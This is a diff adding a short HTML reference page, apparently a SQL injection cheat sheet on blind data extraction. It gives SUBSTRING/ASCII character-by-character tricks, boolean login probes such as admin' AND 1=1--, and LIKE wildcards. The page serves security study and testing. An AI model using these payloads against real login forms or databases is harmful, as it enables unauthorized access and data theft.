@@ -1,0 +1,25 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>Data extraction</title>
+</head><body><b>Retrieving Data as Numbers</b><br/>
+<ul><li>If there is no string column to return output</li>
+<li style="list-style-type: none"><ul><li><tt>SUBSTRING('Admin',1,1)</tt>returns A (use SUBSTR for Oracle)</li>
+<li><tt>ASCII('A')</tt>returns 65</li>
+<li><tt>ASCII(SUBSTR('Admin',1,1))</tt>returns 65</li>
+</ul>
+</li>
+</ul>
+<br/>
+<b>Testing TRUEness and FALSEness for conditional response extraction</b><br/>
+<ul><li style="list-style-type: none"><ul><li><tt>admin' AND 1=1--</tt>(login succeded)</li>
+<li><tt>admin' AND 1=2--</tt>(login failed)</li>
+</ul>
+</li>
+</ul>
+<br/>
+<b>Using wildcard characters if there is LIKE in SQL statement<br/>
+</b><ul><li>%	matches any string</li>
+<li>_	matches any character</li>
+</ul>
+</body></html>
